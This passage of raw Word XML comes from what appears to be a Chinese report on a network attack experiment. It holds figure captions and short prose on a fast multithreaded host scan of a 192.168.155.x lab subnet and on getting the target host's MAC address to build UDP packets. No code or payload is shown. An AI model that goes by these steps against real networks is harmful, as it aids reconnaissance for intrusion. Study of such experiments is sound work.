      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图5- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="008E2EC8" w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00025B07" w:rsidRPr="00246280">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>被攻击主机网络连接情况</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217D4D25" w14:textId="6F9FDC68" w:rsidR="002F5BD0" w:rsidRDefault="002F5BD0" w:rsidP="002F5BD0">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62D76C07" w14:textId="77777777" w:rsidR="00383D6B" w:rsidRPr="0034487A" w:rsidRDefault="00383D6B" w:rsidP="002F5BD0">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16A43F68" w14:textId="01A11985" w:rsidR="00922AF7" w:rsidRPr="0034487A" w:rsidRDefault="002F5BD0" w:rsidP="002F5BD0">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:tab/>
        <w:t>主机扫描过程和结果</w:t>
      </w:r>
      <w:r w:rsidR="00B135EB" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>如图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00B135EB" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00922AF7" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>利用多线程技术实现主机的快速扫描，一个网段扫描时间只需2秒左右。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C8E80C" w14:textId="77777777" w:rsidR="006C6D3B" w:rsidRPr="0034487A" w:rsidRDefault="00577D28" w:rsidP="003F5BAF">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>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219F5A9F" w:rsidR="00922AF7" w:rsidRPr="00176DFE" w:rsidRDefault="006C6D3B" w:rsidP="008D142E">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图5- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="008E2EC8" w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00B135EB" w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B135EB" w:rsidRPr="00176DFE">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>主机扫描过程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0178A74D" w14:textId="4C0190C0" w:rsidR="00922AF7" w:rsidRPr="0034487A" w:rsidRDefault="00922AF7" w:rsidP="0068665F">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>扫描结果</w:t>
      </w:r>
      <w:r w:rsidR="00B135EB" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00B135EB" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，局域网内192.168.155.1和192.168.155.2开放：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63EF4379" w14:textId="77777777" w:rsidR="006C6D3B" w:rsidRPr="0034487A" w:rsidRDefault="00922AF7" w:rsidP="003F5BAF">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>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0355A0F1" w:rsidR="00922AF7" w:rsidRDefault="006C6D3B" w:rsidP="00C778AF">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图5- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="008E2EC8" w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00B135EB" w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B135EB" w:rsidRPr="00524DA7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>主机扫描结果</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="070BEFD5" w14:textId="32D99F8F" w:rsidR="00A635C1" w:rsidRDefault="00A635C1" w:rsidP="00A635C1">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61CAF5CE" w14:textId="77777777" w:rsidR="00A635C1" w:rsidRPr="00A635C1" w:rsidRDefault="00A635C1" w:rsidP="00A635C1">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D163907" w14:textId="1DAA274A" w:rsidR="00577D28" w:rsidRPr="0034487A" w:rsidRDefault="00BE0DCB" w:rsidP="00577D28">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1176" w:name="_Toc482141272"/>
      <w:bookmarkStart w:id="1177" w:name="_Toc482141945"/>
      <w:bookmarkStart w:id="1178" w:name="_Toc482522668"/>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>AC</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>地址获取</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1176"/>
      <w:bookmarkEnd w:id="1177"/>
      <w:bookmarkEnd w:id="1178"/>
    </w:p>
    <w:p w14:paraId="6211D2C9" w14:textId="00625453" w:rsidR="00922AF7" w:rsidRPr="0034487A" w:rsidRDefault="00922AF7" w:rsidP="00E471A2">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>选择被攻击的主机的IP地址192.168.155.2，获取主机MAC地址</w:t>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>所示</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，用于构建UDP数据包。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BCE186C" w14:textId="77777777" w:rsidR="006C6D3B" w:rsidRPr="0034487A" w:rsidRDefault="00577D28" w:rsidP="003F5BAF">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>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56516868" w:rsidR="00BE0DCB" w:rsidRPr="0034487A" w:rsidRDefault="006C6D3B" w:rsidP="008D142E">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText>SEQ 图5- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="008E2EC8" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>被攻击主机</w:t>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>MAC</w:t>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>地址</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4FBBAC" w14:textId="01910974" w:rsidR="00F83D93" w:rsidRPr="0034487A" w:rsidRDefault="00F83D93" w:rsidP="00577D28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34246ACD" w14:textId="2AAF2D88" w:rsidR="0097518D" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="00577D28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D72772D" w14:textId="5FEE38E0" w:rsidR="0097518D" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="00577D28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5108C46A" w14:textId="4DC31705" w:rsidR="0097518D" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="00577D28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5057013E" w14:textId="5BCFCE6F" w:rsidR="0097518D" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="00577D28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E2F65DE" w14:textId="2950B298" w:rsidR="0097518D" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="00577D28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17E032B5" w14:textId="7D949BC3" w:rsidR="0097518D" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="00577D28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49288857" w14:textId="4F4CD1B2" w:rsidR="0097518D" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="00577D28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51157B85" w14:textId="122F76DD" w:rsidR="0097518D" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="00577D28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41EFBCE0" w14:textId="454B2D60" w:rsidR="0097518D" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="00577D28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
